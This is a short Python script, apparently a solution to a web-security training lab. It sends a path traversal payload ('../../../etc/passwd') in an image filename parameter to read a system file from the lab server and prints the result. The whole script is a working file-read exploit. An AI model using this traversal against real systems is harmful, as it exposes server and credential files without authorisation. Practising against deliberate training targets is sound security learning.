import requests

s = requests.Session()

site = 'ac7d1f6a1e7a1f4fc0b31a5300f8009a.web-security-academy.net'
extension = '/var/www/images/../../../etc/passwd'

url = f'''https://{site}/image?filename={extension}'''
resp = s.get(url)
print(resp.text)